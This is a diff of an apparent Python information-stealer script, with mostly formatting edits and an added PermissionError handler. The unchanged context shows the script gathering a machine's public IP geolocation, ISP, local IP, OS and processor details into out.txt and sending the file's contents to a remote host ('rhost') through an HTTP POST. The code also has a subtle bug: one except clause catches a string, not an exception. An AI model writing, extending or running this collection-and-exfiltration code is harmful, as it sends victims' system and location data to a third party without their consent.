@@ -18,7 +18,7 @@ def upload():
     try:
         with open("out.txt", "r") as out:
             info = out.read()
-    
+
         if info:
             requests.post(rhost, data={"INFO": info})
     except FileNotFoundError:
@@ -30,9 +30,9 @@ def getIPInfo():
         response = requests.get(url)
         data = response.json()
     except "Not Found":
-#        print("[-] Url is unreachable")
+#        print("[ - ] Url is unreachable")
         return None
-    
+
     location = {
         "status": data["status"],
         "ip": data["query"],
@@ -47,9 +47,9 @@ def getIPInfo():
         "org": data["org"],
         "as": data["as"]
     }
-    
+
     ip = socket.gethostbyname(socket.gethostname())
-    
+
     if location:
         with open("out.txt", "a", encoding="utf-8") as out:
             json.dump(location, out, indent=4)
@@ -66,14 +66,17 @@ def getOSInfo():
         return None
 
 def createFile():
-    with open("out.txt", "w") as file:
-        file.write("User Info\n")
-    
+    try:
+    	with open("out.txt", "w") as file:
+        	file.write("User Info\n")
+    except PermissionError:
+    	return None
+
 def getProcessorInfo(procFile):
     try:
         with open(procFile, "r") as procFileOpen:
             lines = procFileOpen.readlines()
-        
+
         try:
             with open("out.txt", "a", encoding="utf-8") as out:
                 out.write("\n Processor Info: \n")
